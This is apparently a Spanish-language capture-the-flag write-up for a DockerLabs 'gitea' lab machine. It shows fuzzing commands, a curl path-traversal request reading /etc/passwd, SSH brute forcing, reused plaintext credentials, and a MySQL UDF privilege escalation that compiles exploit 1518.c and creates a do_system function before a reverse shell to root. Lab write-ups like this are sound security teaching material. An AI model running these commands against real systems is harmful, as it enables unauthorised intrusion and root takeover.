nmap: 22, 80, 3000

![image](https://github.com/user-attachments/assets/19f5d5f2-4a90-4310-bbd4-14c4d074484e)

---

nos vamos a la pagina del puerto 80 y 3000

![image](https://github.com/user-attachments/assets/283cdfa3-b5ec-4a3c-991f-3de987903851)

![[dockerlabs/medio/gitea/test3.png]]

en la pagina no hay mucho mas que información y en la pagina del puerto 3000 hay una versión pero no hay exploit de esa versión, solo de la 1.22.4 que es la versión anterior.
en el código fuente hay unos puntos importantes

![[dockerlabs/medio/gitea/test4.png]]

primero un URL que si la ingresamos a hosts nos enviara otra vez a la pagina del puerto 3000, y abajo hay un  "csrftoken"  con un código, pero la verdad que el código da unos números pero probablemente hay un login. 
ahora probando otra vez con la URL que encontramos en el código fuente la vamos modificando, entonces ingresamos un "gitea.dl" y veremos que tenemos un login

![[dockerlabs/medio/gitea/test5.png]]

como vemos en los login da algunas credenciales pero no funcionan pero por si acaso la vamos a guardar. 

     admin@gitea.com 
    PassAdmin123-

ahora haremos un FFUF

     ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://gitea.dl -H "Host: FUZZ.gitea.dl" -fs 13615 

![[dockerlabs/medio/gitea/test6.png]]

nos da "dev" lo agregamos al hosts y nos da esta pagina

![[dockerlabs/medio/gitea/test7.png]]

como no tenemos mucho hacemos un gobuster para descubrir mas si es que tiene mas

     gobuster dir -u http://dev.gitea.dl/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,html,py,txt -t 64


![[dockerlabs/medio/gitea/test8.png]]

nos dio uno llamativo que es "search" 

![[dockerlabs/medio/gitea/test9.png]]

probamos pero no da nada y como vimos al principio en el código fuente da una URL que contiene este usuario creo yo, lo añadimos al hosts

![[dockerlabs/medio/gitea/test10.png]]

obtenemos esta pagina pero al final de la pagina da un nombre que podría ser un usuario, pero no tiene muchas cosas mas, así que le seguimos buscando y haciendo otro FFUF

![[dockerlabs/medio/gitea/test11.png]]

    ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://s3cr3tdir.dev.gitea.dl -H "Host: FUZZ.s3cr3tdir.dev.gitea.dl" -fs 13615 

ahora hacemos lo mismo pero agregamos el "s3cr3tdir"

![[dockerlabs/medio/gitea/test12.png]]

y como vemos tenemos lo mismo que vimos en el primer codigo que es el URL exactamente igual. 

![[dockerlabs/medio/gitea/test13.png]]

pero nos vamos a logear ahora para ver que hay. 

![[dockerlabs/medio/gitea/test14.png]]

nos iremos a explore y veremos esos 3 repositorios  y el que contiene un código es el 
myapp >> app.py

![[dockerlabs/medio/gitea/test15.png]]

y en esta linea tiene una vulnerabilidad

![[dockerlabs/medio/gitea/test16.png]]

a esa vulnerabilidad se le puede realizar un "path traversal" en la pagina principal o sea gitea.dl, así que podemos descargar archivos con esa vulnerabilidad o lograr visualizar 

lanzamos 

     curl "http://gitea.dl/download?filename=../../../../../etc/passwd"

![[dockerlabs/medio/gitea/test17.png]]

y vemos que nos entrega la información que esperamos, buscamos en los otros archivos otras funciones o códigos y encontramos esto

![[dockerlabs/medio/gitea/test18.png]]

probamos lo mismo pero con el código de info.txt

![[dockerlabs/medio/gitea/test19.png]]

nos da un error así que probamos, pero nos dice que hay un archivo de la información en /opt así que probamos suerte

![[dockerlabs/medio/gitea/test20.png]]

se logra la magia y tenemos usuarios y contraseñas como textos. pero no creo que esos son los usuarios reales, así que vamos hacer un ataque de fuerza bruta. 

creamos una carpeta con las contraseñas y hacemos una fuerza bruta con el usuario "designer" que es el usuario del git donde están los códigos. 

![[dockerlabs/medio/gitea/test21.png]]

obtenemos la contraseña de "ssh"

![[dockerlabs/medio/gitea/test22.png]]

ingresamos con las credenciales y tenemos la flag de user

     4683f3b0c2f083bb9588370c0f8ab284

![[dockerlabs/medio/gitea/test23.png]]

como se ve tenemos un puerto abierto de forma local "127.0.0.1:3306"  y 3306 funciona con mysql y tenemos credenciales de un login así que probamos entrar a la base de datos con las credenciales que nos dio el login

      admin@gitea.com 
    PassAdmin123-

     mysql -u admin -pPassAdmin123-


![[dockerlabs/medio/gitea/test24.png]]

tenemos acceso a la base de datos, vamos a realizar esta escalada: https://docs.databricks.com/gcp/en/udf/ (User-Defined Functions) UDF  lo que es pocas palabras

     técnica para escalar privilegios que consiste en cargar una librería compartida maliciosa con el fin de ejecutar código externo y definido por nosotros a nivel de sistema

entonces comenzamos con

    SHOW VARIABLES LIKE '%plugin_dir%';

![[dockerlabs/medio/gitea/test25.png]]

     SHOW VARIABLES LIKE '%secure_file_priv%';

![[dockerlabs/medio/gitea/test26.png]]

![[dockerlabs/medio/gitea/test27.png]]

ahora buscamos una vulnerabilidad o exploit basado en este ataque 

![[dockerlabs/medio/gitea/test28.png]]

nos sirve el primero así que lo tomamos

![[dockerlabs/medio/gitea/test29.png]]

dentro de se exploit contiene un código que intenta cargar códigos o archivos en "system()" así que vamos a pasarlo a la maquina victima

![[dockerlabs/medio/gitea/test30.png]]

ahora lanzamos estos comandos

    gcc -g -c 1518.c
      gcc -g -shared -Wl,-soname,exploit_udf.so -o exploit_udf.so 1518.o -lc

![[dockerlabs/medio/gitea/test31.png]]

tendremos los 3 documentos ahora movemos el exploit a plugins para que la cargue

     mv exploit_udf.so /usr/lib/mysql/plugin/

ahora nos vamos a la base de datos y nos conectamos creamos la función que haga referencia a la librería que agregamos o sea el exploit 

    CREATE FUNCTION do_system RETURNS STRING SONAME 'exploit_udf.so';

![[dockerlabs/medio/gitea/test32.png]]

entonces el exploit cargado podemos ejecutar comando a nivel sistema, podemos por ejemplo cargar una reverse shell hacia nuestro puerto para conectarnos directo a root 

![[dockerlabs/medio/gitea/root.png]]

somos root! 
